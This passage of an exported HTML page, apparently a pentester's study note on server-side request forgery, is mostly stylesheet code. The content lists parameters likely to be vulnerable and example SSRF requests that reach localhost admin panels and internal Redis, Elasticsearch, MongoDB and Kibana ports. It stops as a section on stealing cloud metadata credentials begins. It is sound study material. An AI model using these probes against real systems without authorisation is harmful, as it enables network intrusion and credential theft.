@@ -1,0 +1,1631 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2026-07-20 Mon 14:09 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Server-Side Request Forgery</title>
+<meta name="author" content="termux" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="style.css" type="text/css"/>
+<style type='text/css'>
+<!--/*--><![CDATA[/*><!--*/
+/* nice-org-html.css
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+*/
+
+/* basic layout ***************************************************************/
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+html {
+    font-family: Sans;
+    line-height: 1.3;
+    font-size: calc(15px + 0.390625vw);
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    background: #999; /* overwritten with theme --bg */
+    width: 100%;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family:
+	-apple-system,
+	BlinkMacSystemFont,
+	segoe ui,
+	Roboto,
+	Oxygen,
+	Ubuntu,
+	Cantarell,
+	open sans,
+	helvetica neue,
+	sans-serif,
+	system-ui
+}
+
+#preamble,
+#postamble {
+    width: 100%;
+}
+
+#content {
+    width: 80%;
+    max-width: 80ch;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    flex: 1;
+}
+
+/* custom facing **************************************************************/
+/* The variable values are injected by CSS pre-processing in et-org-html.el */
+:root {
+    --bc-tb: #000000;
+    --bc-block: #595959;
+    --clr: #000000;
+    --clr-tb-hd: #000000;
+    --clr-code: #000000;
+    --bg: #fbf7f0;
+    --bg-code: #cab9b2;
+    --bg-tb-hd: #cab9b2;
+    --bg-block: #efe9dd;
+    --clr-link: #531ab6;
+    --clr-title: #000000;
+    --clr-todo: #00598b;
+    --bg-todo: initial;
+    --clr-done: #7f0000;
+    --bg-done: initial;
+    --ts-clr: #0031a9;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #0031a9;
+    --bg-constant: initial;
+    --clr-constant: #531ab6;
+    --bg-comment: initial;
+    --clr-comment: #7f0000;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #7f0000;
+    --bg-function: initial;
+    --clr-function: #602938;
+    --bg-variable: initial;
+    --clr-variable: #00603f;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #894000;
+    --bg-doc: initial;
+    --clr-doc: #304463;
+    --bg-builtin: initial;
+    --clr-builtin: #721045;
+    --bg-string: initial;
+    --clr-string: #00598b;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+body[data-mode='light'] {
+    background: var(--bg);
+    color: var(--clr);
+}
+
+body[data-mode='dark'] {
+    background: var(--bg);
+    color: var(--clr);
+    --bc-tb: #ffffff;
+    --bc-block: #989898;
+    --clr: #ffffff;
+    --clr-code: #ffffff;
+    --clr-tb-hd: #ffffff;
+    --bg: #0d0e1c;
+    --bg-tb-hd: #484d67;
+    --bg-code: #484d67;
+    --bg-block: #1d2235;
+    --clr-link: #b6a0ff;
+    --clr-title: #ffffff;
+    --clr-todo: #2fafff;
+    --bg-todo: initial;
+    --clr-done: #ef8386;
+    --bg-done: initial;
+    --ts-clr: #79a8ff;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #79a8ff;
+    --bg-constant: initial;
+    --clr-constant: #b6a0ff;
+    --bg-comment: initial;
+    --clr-comment: #ef8386;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #ef8386;
+    --bg-function: initial;
+    --clr-function: #f78fe7;
+    --bg-variable: initial;
+    --clr-variable: #4ae2f0;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #ff7f86;
+    --bg-doc: initial;
+    --clr-doc: #9ac8e0;
+    --bg-builtin: initial;
+    --clr-builtin: #feacd0;
+    --bg-string: initial;
+    --clr-string: #2fafff;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+/* exceptions for badly rendering themes **************************************/
+body[data-theme='leuven'],
+body[data-theme='leuven-dark'] {
+    --bg-code: var(--bg-block);
+}
+
+/* ootb page layout ***********************************************************/
+#view-controls {
+    position: sticky;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    color: var(--clr-code);
+    height: 2.5rem;
+    padding-top: 1.25rem;
+    padding-bottom: 1.25rem;
+    z-index: 100;
+    border-radius: 5px; /* Rounded corners */
+}
+#toggle-mode {
+    position: absolute;
+    right: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#goto-top {
+    display: none;
+}
+#goto-top[data-show="true"] {
+    position: relative;
+    display: block;
+    text-align: center;
+    font-size: 1rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#toggle-toc {
+    display: none;
+}
+#toggle-toc[data-show="true"] {
+    position: absolute;
+    left: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+
+#toggle-toc:hover,
+#goto-top:hover,
+#toggle-mode:hover {
+    cursor: pointer;
+}
+
+#table-of-contents {
+    display: none;
+}
+#table-of-contents[data-show="true"] {
+    width: 80%;
+    max-width: 80rem;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    background: var(--bg);
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+
+#table-of-contents::-webkit-scrollbar {
+    display: none;
+}
+
+body[data-toc="true"] #content * {
+    display: none;
+}
+body[data-toc="true"] #content #table-of-contents,
+body[data-toc="true"] #content #table-of-contents * {
+    display: block;
+}
+
+
+/* misc elements **************************************************************/
+
+hr {
+    height: 0;
+    color: inherit;
+}
+
+b,
+strong {
+    font-weight: bolder;
+}
+
+code,
+kbd,
+samp,
+pre {
+    font-family:
+	Menlo,
+	ui-monospace,
+	SFMono-Regular,
+	Consolas,
+	'Liberation Mono',
+	monospace;
+}
+
+small {
+    font-size: 80%;
+}
+
+sub,
+sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+}
+
+sub {
+    bottom: -0.25em;
+}
+
+sup {
+    top: -0.5em;
+}
+
+table {
+    text-indent: 0;
+    border-color: inherit;
+}
+
+summary {
+    display: list-item;
+}
+
+h1 {
+    color: var(--clr-title);
+    text-align: center;
+}
+h2 {
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+}
+
+code {
+    color: var(--clr-code);
+    background: var(--bg-code);
+    border-radius: 2px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+pre::-webkit-scrollbar {
+    display: none;
+}
+
+.todo {
+    color: var(--clr-todo);
+    background: var(--bg-todo);
+}
+
+.done {
+    color: var(--clr-done);
+    background: var(--bg-done);
+}
+
+.timestamp-wrapper {
+    font-size: 0.8rem;
+    color: var(--clr-ts);
+}
+
+table {
+    width: 100%;
+    border: 2px solid var(--bc-tb);
+}
+
+thead {
+    color: var(--clr-tb-hd);
+    background: var(--bg-tb-hd);
+}
+
+td, th {
+    border: thin solid var(--bc-tb);
+}
+
+li {
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+#text-table-of-contents li a:before {
+    content: "• "
+}
+
+a {
+    text-decoration: none;
+    color: var(--clr-link);
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.MathJax_Display {
+    font-size: 1.25em;
+}
+
+img {
+    max-width: 100%;
+}
+
+pre {
+    padding: 1rem;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-block);
+    font-size: 0.9rem;
+    overflow-x: auto;
+    -ms-overflow-style: none;
+    scrollbar-width: thin;
+}
+
+.org-src-wrapper {
+    position: relative;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+}
+
+.org-src-bar {
+    position: relative;
+    top: 0rem;
+    width: 100%;
+    background: var(--bg-code);
+    border-radius: 0.5rem;
+    text-align: right;
+    min-height: 1rem;
+}
+
+.org-src-wrapper .org-src-container {
+    position: relative;
+    border: none;
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+    z-index: 0;
+}
+
+.org-src-wrapper .org-src-container pre.src {
+    border: none !important;
+    background: var(--bg-code) !important;
+    padding-top: 0rem;
+    padding-bottom: 0rem;
+    margin-top: 0rem;
+    margin-bottom: 0rem;
+    padding-bottom: 1.6rem;
+}
+
+.org-src-wrapper .org-src-bar .srcLangLabel {
+    top: 0rem;
+    right: 1.6rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    font-size: 0.8rem;
+    opacity: 0.5;
+    z-index: 1;
+    display: none;
+}
+
+.org-src-wrapper .org-src-bar .copyBtn {
+    top: 0rem;
+    right: 0.1rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-right: 0.7rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 0.8rem;
+    cursor: pointer;
+    opacity: 0.5;
+    z-index: 1;
+    transition: opacity 0.3s;
+}
+
+.org-src-wrapper .copyBtn:hover {
+    opacity: 1;
+}
+
+.org-src-wrapper .copyBtn i {
+    margin-right: 0.5rem;
+    padding: 0.5rem;
+}
+
+.admonition {
+    margin: 0.2rem;
+    color: inherit;
+    border-left: .25rem solid;
+}
+.admonition-title {
+    margin: 0 0 0.5rem 0.5rem;
+    padding: 0.5rem 0 0 0;
+    display: flex;
+    align-items: center;
+}
+.admonition-content > p {
+    margin: 0.5rem 0 0 0.5rem;
+    padding: 0 0 0.5rem 0;
+}
+
+.admonition.note {
+    border-left-color: var(--clr-note);
+}
+.admonition-title.note {
+    color: var(--clr-note);
+}
+.admonition-title.note:before {
+    content: '';
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-note);
+    mask-size: cover;    
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path class="admonition-icon-note" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+.admonition-icon-note {
+    fill: var(--clr-note);
+}
+
+.admonition.tip {
+    border-left-color: var(--clr-tip);
+}
+.admonition-title.tip {
+    color: var(--clr-tip);
+}
+.admonition-title.tip:before {
+    content: '';
+    fill: var(--clr-tip);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-tip);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>');    
+}
+
+.admonition.important {
+    border-left-color: var(--clr-important);
+}
+.admonition-title.important {
+    color: var(--clr-important);
+}
+.admonition-title.important:before {
+    content: '';
+    fill: var(--clr-important);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-important);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');    
+}
+
+.admonition.warning {
+    border-left-color: var(--clr-warning);
+}
+.admonition-title.warning {
+    color: var(--clr-warning);
+}
+.admonition-title.warning:before {
+    content: '';
+    color: var(--clr-warning);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-warning);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');
+}
+
+
+.admonition.caution {
+    border-left-color: var(--clr-caution);
+}
+.admonition-title.caution {
+    color: var(--clr-caution);
+}
+.admonition-title.caution:before {
+    content: '';
+    fill: var(--clr-caution);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-caution);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M4.47.22A.749.749 0 0 1 5 0h6c.199 0 .389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749 0 0 1-.22.53l-4.25 4.25A.749.749 0 0 1 11 16H5a.749.749 0 0 1-.53-.22L.22 11.53A.749.749 0 0 1 0 11V5c0-.199.079-.389.22-.53Zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5ZM8 4a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4Zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+/* responsive layouts *********************************************************/
+
+@media only screen and (max-width: 768px) {
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+@media only screen and (max-width: 480px) {
+    #view-controls {
+	padding-top: 1.5em;
+	padding-bottom: 1.5em;
+    }
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+
+/* generated header and footer ************************************************/
+
+#generated-header,
+#generated-footer {
+    width: 90%;
+    margin-left: 5%;
+    margin-right: 5%;
+    line-height: 1;
+}
+.generated header {
+    top: 0;
+    left: 0;
+}
+.generated footer {
+    bottom: 0;
+    left: 0;
+}
+.generated header a,
+.generated footer a {
+    display: inline;
+    color: var(--clr-title);
+    text-decoration: none;
+    transition: color .15s ease-in;
+}
+.generated header a:hover,
+.generated footer a:hover {
+    color: var(--clr-link);
+}
+
+.generated header nav {
+    position: relative;
+    margin-top: 1rem;
+    top: 0;
+    left: 0;
+}
+.generated footer nav {
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+.generated .separator {
+    display: block;
+    width: 111%;
+    margin-left: -5.5%;
+    max-width: 100vw;
+    height: 0.125rem;
+    background: var(--bg-code);
+}
+
+.generated a .nav-title,
+.generated a .nav-author {
+    display: inline;
+    margin-top: 1rem;
+    margin-bottom: 1rem;
+    padding-right: 10rem;
+}
+
+.generated .nav-title {
+    letter-spacing: .075rem;
+    font-weight: 500;
+}
+
+.generated .nav-toggle {
+    display: none;
+}
+.generated .nav-button {
+    display: none;
+}
+.generated .nav-list {
+    overflow-y: hidden;
+    display: block;
+    float: right;
+    list-style: none;
+    margin-bottom: 0;
+    margin-top: 0;
+}
+
+.generated .nav-item {
+    position: relative;
+    float: left;
+    margin: 0;
+}
+.generated .nav-link {
+    position: relative;
+    float: right;
+    margin-left: 2rem;
+    margin-right: 0rem;
+}
+
+.generated .nav-toggle {
+    max-height: 0;
+    visibility: hidden;
+    overflow-y: hidden;
+}
+
+.generated header .separator {
+    margin-top: 1rem;
+    margin-bottom: 0;
+}
+
+.generated footer .separator {
+    margin-bottom: 1rem;
+    margin-top: 0;
+}
+
+.generated .menu-sep {
+    display: none;
+    max-height: 0;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+
+.generated footer {
+    padding-bottom: 1rem;
+}
+
+.generated.compact footer {
+    padding-bottom: 0;
+}
+
+.generated.compact header .separator {
+    margin-top: 0;
+    margin-bottom:0;
+}
+.generated.compact footer .separator {
+    margin-bottom: 1rem;
+}
+
+.generated.compact .nav-toggle {
+    visibility: visible;
+}
+
+.generated.compact .nav-toggle + label span::before {
+    transition: all 0.2s ease-in;
+}
+.generated.compact .nav-toggle:checked + label span::before {
+    transform: translateX(0.04rem) translateY(-0.25rem) rotate(90deg);
+    transition: all 0.2s ease;
+}
+
+.generated.compact .menu-sep {
+    display: flex;
+    max-height: 0rem;
+}
+.generated.compact .nav-toggle:checked + label + .menu-sep {
+    display: block;
+    position: relative;
+    max-height: 1rem;
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-list {
+    float: none !important;
+    position: relative;
+    display: block;
+    padding-left: 0;
+    padding-right: 0;
+    z-index: 5;
+    width: 100%;
+    height: auto;
+    max-height: 0;
+    margin: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+.generated.compact .nav-toggle:checked + label ~ .nav-list {
+    display: block;
+    max-height: 100rem;
+    overflow-y: hidden;
+}
+.generated.compact header .nav-toggle:checked + label ~ .nav-list {
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-button {
+    display: inline;
+    position: relative;
+    float: right;
+    font-size: 1rem;
+}
+.generated.compact .nav-button span::before {
+    display: inline-block;
+    content: '\2807';
+    font-size: 2rem;
+    transform: translateX(0.25rem) translateY(-0.5rem);
+}
+
+.generated.compact .nav-item {
+    float: none !important;
+    text-align: center !important;
+}
+.generated.compact .nav-link {
+    line-height: 2rem;
+    margin-left: 2rem;
+    margin-right: 2rem;
+    float: none !important;
+}
+
+.generated.compact footer .separator.menu-sep {
+    margin-bottom: -1rem;
+}
+
+.hidden {
+    display: none;
+}
+
+.collapsible:hover {
+    cursor: pointer;
+}
+
+.collapsible.collapsed::after {
+    display: inline-block;
+    content: '...';
+}
+/*]]>*/-->
+</style>
+</head>
+<body>
+<div id="preamble" class="status">
+<div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
+</div>
+<div id="content" class="content">
+<h1 class="title">Server-Side Request Forgery</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgd35c6f9">1. Identifying SSRF</a></li>
+<li><a href="#orge057f14">2. Basic Exploitation</a>
+<ul>
+<li><a href="#org5840cca">Internal Service Access</a></li>
+<li><a href="#org953b613">Cloud Metadata Endpoints</a></li>
+<li><a href="#orge318f40">Internal Port Scanning</a></li>
+<li><a href="#org50ac193">Alternative URL Schemes</a></li>
+</ul>
+</li>
+<li><a href="#org1d95392">3. Bypass Techniques</a></li>
+<li><a href="#org73a8152">4. SSRF as Access Control Bypass</a>
+<ul>
+<li><a href="#orgaf6d5dd">Case study — Operation Coldstart CTF</a></li>
+</ul>
+</li>
+<li><a href="#org4b46ccb">5. Blind SSRF</a></li>
+<li><a href="#org89ae20a">6. Testing Methodology</a></li>
+<li><a href="#org8ecfab1">7. Reporting Template</a></li>
+<li><a href="#org1529e20">Tips</a></li>
+</ul>
+</div>
+</div>
+<p>
+The server is induced to make HTTP requests to attacker-controlled
+destinations — internal services, cloud metadata endpoints, or
+arbitrary external hosts. The server acts as a proxy, bypassing
+network controls that would block the attacker directly. Impact
+ranges from internal network reconnaissance to credential theft
+and RCE.
+</p>
+
+<p>
+Related: <a href="../org/20260611T064753--web-application-testing-methodology__cybersecurity_pentesting_technique.html">Web Application Testing Methodology</a>
+         <a href="../org/20260611T065009--api-testing-methodology__cybersecurity_pentesting_technique.html">API Testing Methodology</a>
+         <a href="../org/20260614T002010--pt1-vulnerability-classification-cheat-sheet__comparison_cybersecurity_pentesting_reference.html">PT1 Vulnerability Classification Cheat Sheet</a>
+         <a href="../org/20260207T070540==cvss--common-vulnerability-scoring-system__concept_cybersecurity.html">CVSS</a>
+         <a href="../org/pentest/20260712T205856--operation-coldstart__ctf.html">Operation Coldstart CTF</a>
+</p>
+<div id="outline-container-orgd35c6f9" class="outline-2">
+<h2 id="orgd35c6f9">1. Identifying SSRF</h2>
+<div class="outline-text-2" id="text-orgd35c6f9">
+<p>
+Look for any parameter that causes the server to fetch a remote
+resource — URLs, hostnames, file paths, or IP addresses passed
+to the server.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_068e633e10dd448c84ddc83a64c3e4bc>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_068e633e10dd448c84ddc83a64c3e4bc=document.querySelector('button[name=btn_068e633e10dd448c84ddc83a64c3e4bc]');
+copyBtnbtn_068e633e10dd448c84ddc83a64c3e4bc.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Common parameter names\nurl=, path=, src=, dest=, redirect=, uri=, image=,\nfetch=, load=, resource=, endpoint=, webhook=, callback=\n\n# Common features that trigger SSRF\n- Image/file import from URL\n- PDF generation from URL\n- Webhook configuration\n- URL preview / link unfurling\n- Remote resource fetching (RSS, API proxying)\n- XML processing (XXE can chain to SSRF)\n`);copyBtnbtn_068e633e10dd448c84ddc83a64c3e4bc.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_068e633e10dd448c84ddc83a64c3e4bc.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text"># Common parameter names
+url=, path=, src=, dest=, redirect=, uri=, image=,
+fetch=, load=, resource=, endpoint=, webhook=, callback=
+
+# Common features that trigger SSRF
+- Image/file import from URL
+- PDF generation from URL
+- Webhook configuration
+- URL preview / link unfurling
+- Remote resource fetching (RSS, API proxying)
+- XML processing (XXE can chain to SSRF)
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orge057f14" class="outline-2">
+<h2 id="orge057f14">2. Basic Exploitation</h2>
+<div class="outline-text-2" id="text-orge057f14">
+</div>
+<div id="outline-container-org5840cca" class="outline-3">
+<h3 id="org5840cca">Internal Service Access</h3>
+<div class="outline-text-3" id="text-org5840cca">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_264fcf94474f49fdb6c7fb59930da91c>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_264fcf94474f49fdb6c7fb59930da91c=document.querySelector('button[name=btn_264fcf94474f49fdb6c7fb59930da91c]');
+copyBtnbtn_264fcf94474f49fdb6c7fb59930da91c.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Test for basic SSRF — replace URL with localhost\nGET /fetch?url=http://localhost/\nGET /fetch?url=http://127.0.0.1/\nGET /fetch?url=http://0.0.0.0/\n\n# Access internal admin panels\nGET /fetch?url=http://localhost:8080/admin\nGET /fetch?url=http://127.0.0.1:8080/admin\nGET /fetch?url=http://192.168.1.1/admin\n\n# Internal service discovery\nGET /fetch?url=http://127.0.0.1:6379/    # Redis\nGET /fetch?url=http://127.0.0.1:9200/    # Elasticsearch\nGET /fetch?url=http://127.0.0.1:27017/   # MongoDB\nGET /fetch?url=http://127.0.0.1:5601/    # Kibana\n`);copyBtnbtn_264fcf94474f49fdb6c7fb59930da91c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_264fcf94474f49fdb6c7fb59930da91c.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Test for basic SSRF &#8212; replace URL with localhost
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://localhost/
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://127.0.0.1/
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://0.0.0.0/
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Access internal admin panels
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://localhost:8080/admin
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://127.0.0.1:8080/admin
+GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://192.168.1.1/admin
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Internal service discovery
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://127.0.0.1:6379/    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Redis
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://127.0.0.1:9200/    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Elasticsearch
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://127.0.0.1:27017/   <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">MongoDB
+</span>GET /fetch?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">url</span>=http://127.0.0.1:5601/    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Kibana</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org953b613" class="outline-3">
+<h3 id="org953b613">Cloud Metadata Endpoints</h3>
+<div class="outline-text-3" id="text-org953b613">
+<p>
+High impact — IAM credentials from metadata APIs allow lateral
+movement to cloud infrastructure.
+</p>
+
+<div class='org-src-wrapper'>
